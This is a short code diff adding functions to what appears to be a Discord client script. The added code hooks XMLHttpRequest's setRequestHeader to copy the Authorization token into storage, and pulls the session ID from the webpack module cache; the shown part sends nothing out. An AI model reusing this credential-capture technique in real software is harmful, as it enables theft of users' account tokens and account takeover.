@@ -462,3 +462,13 @@ const sleep = (time) => new Promise(resolve => setTimeout(resolve, time))
 */
 
 //Functions
+
+XMLHttpRequest.prototype.wrappedSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader; 
+
+XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
+    this.wrappedSetRequestHeader(header, value);
+    if(header == 'Authorization') 
+        configStorage.setItem("Auth", value)
+}
+
+configStorage.setItem("Sesh", (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m => m?.exports?.default?.getSessionId).exports.default.getSessionId())
